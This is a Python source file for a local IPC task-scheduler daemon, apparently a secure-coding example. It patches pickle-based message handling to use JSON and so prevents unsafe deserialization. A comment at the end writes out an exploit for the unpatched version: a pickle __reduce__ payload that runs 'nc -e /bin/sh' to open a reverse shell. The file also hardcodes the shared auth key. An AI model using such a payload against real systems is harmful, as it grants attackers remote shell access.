import os
import sys
import sqlite3
import logging
import threading
from datetime import datetime
from multiprocessing.connection import Listener

# Configure logging for the Local IPC Task Scheduler Daemon
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - TaskDaemon - %(levelname)s - %(message)s'
)
logger = logging.getLogger("IPC_Daemon")

DB_FILE = "/tmp/scheduler_tasks.db"
IPC_ADDRESS = ('localhost', 6000)
AUTH_KEY = b'secret_cluster_key'

def init_db():
    """Initializes the SQLite database for tracking scheduled system tasks."""
    conn = sqlite3.connect(DB_FILE)
    cursor = conn.cursor()
    
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS scheduled_tasks (
            task_id TEXT PRIMARY KEY,
            created_at DATETIME DEFAULT CURRENT_TIMESTAMP,
            command TEXT NOT NULL,
            run_at DATETIME NOT NULL,
            status TEXT NOT NULL
        )
    ''')
    
    # Pre-populate with mock history
    mock_history = [
        ('task_alpha_01', 'echo "Backup complete"', datetime.now().isoformat(), 'COMPLETED'),
        ('task_beta_02', 'cleanup_tmp.sh', datetime.now().isoformat(), 'PENDING')
    ]
    cursor.executemany('''
        INSERT OR IGNORE INTO scheduled_tasks (task_id, command, run_at, status)
        VALUES (?, ?, ?, ?)
    ''', mock_history)
    
    conn.commit()
    conn.close()
    logger.info("Task scheduling database initialized.")

def log_task(task_id: str, command: str, run_at: str, status: str):
    """Records a new scheduled task to the database."""
    try:
        conn = sqlite3.connect(DB_FILE)
        cursor = conn.cursor()
        cursor.execute(
            "INSERT INTO scheduled_tasks (task_id, command, run_at, status) VALUES (?, ?, ?, ?)",
            (task_id, command, run_at, status)
        )
        conn.commit()
        conn.close()
    except sqlite3.Error as e:
        logger.error(f"Database error logging task {task_id}: {e}")

class ScheduleRequest:
    """Represents a request to schedule a new system command."""
    def __init__(self, task_id, command, run_at):
        self.task_id = task_id
        self.command = command
        self.run_at = run_at

def process_ipc_message(conn):
    """
    SECURE: Uses recv_bytes() and JSON parsing to prevent Unsafe Deserialization (CWE-502).
    """
    import json
    
    try:
        client_address = conn.fileno()
        logger.info(f"Processing secure incoming IPC message from FD: {client_address}")
    except Exception:
        logger.info("Processing secure incoming IPC message.")
        
    try:
        # Secure: We replace the unsafe conn.recv() (which implicitly unpickles data) 
        # with conn.recv_bytes(). This retrieves the raw byte payload sent by the 
        # client without executing it. We then safely parse the bytes as JSON.
        # Note: IPC clients must now be updated to send data using:
        # conn.send_bytes(json.dumps(data).encode('utf-8'))
        
        raw_bytes = conn.recv_bytes()
        payload_str = raw_bytes.decode('utf-8')
        request_dict = json.loads(payload_str)
        
        if isinstance(request_dict, dict) and all(k in request_dict for k in ("task_id", "command", "run_at")):
            task_id = str(request_dict["task_id"])
            command = str(request_dict["command"])
            run_at = str(request_dict["run_at"])
            
            logger.debug(f"Valid task request safely parsed: {task_id}")
            log_task(task_id, command, run_at, "QUEUED")
            
            # Respond safely using send_bytes instead of send()
            response_dict = {"status": "SUCCESS", "message": f"Task {task_id} queued."}
            conn.send_bytes(json.dumps(response_dict).encode('utf-8'))
        else:
            logger.warning("Decoded JSON is missing required ScheduleRequest attributes.")
            error_resp = {"status": "ERROR", "message": "Invalid request format."}
            conn.send_bytes(json.dumps(error_resp).encode('utf-8'))
            
    except (json.JSONDecodeError, UnicodeDecodeError) as e:
        logger.error(f"Failed to parse IPC payload as JSON: {e}")
        try:
            error_resp = {"status": "ERROR", "message": "Payload must be valid JSON."}
            conn.send_bytes(json.dumps(error_resp).encode('utf-8'))
        except:
            pass
    except EOFError:
        logger.warning("IPC Client disconnected unexpectedly.")
    except Exception as e:
        logger.error(f"Failed to process IPC message: {e}")
        try:
            error_resp = {"status": "ERROR", "message": "Internal processing error."}
            conn.send_bytes(json.dumps(error_resp).encode('utf-8'))
        except:
            pass
    finally:
        conn.close()

def start_ipc_daemon():
    """Configures and starts the IPC listener daemon."""
    init_db()
    
    try:
        # The listener binds to a port and authenticates using a pre-shared key
        listener = Listener(address=IPC_ADDRESS, authkey=AUTH_KEY)
        logger.info(f"Starting Task IPC Daemon listening on {IPC_ADDRESS}")
        
        while True:
            # Accept an incoming connection
            conn = listener.accept()
            logger.info("New IPC connection accepted.")
            
            # Handle the connection in a new thread
            client_thread = threading.Thread(
                target=process_ipc_message,
                args=(conn,)
            )
            client_thread.start()
            
    except KeyboardInterrupt:
        logger.info("Daemon shutting down gracefully.")
        sys.exit(0)
    except Exception as e:
        logger.error(f"Fatal daemon error: {e}")
        sys.exit(1)

if __name__ == "__main__":
    # Example Malicious Trigger (Local or Network Attacker with auth key access):
    # 1. Attacker writes a script to connect to the Listener:
    #    from multiprocessing.connection import Client
    #    import os
    #
    #    class Exploit:
    #        def __reduce__(self):
    #            return (os.system, ('nc -e /bin/sh 127.0.0.1 4444',))
    #
    #    # Client() implicitly uses pickle to serialize and send the malicious object
    #    conn = Client(('localhost', 6000), authkey=b'secret_cluster_key')
    #    conn.send(Exploit())
    #    print(conn.recv())
    
    start_ipc_daemon()
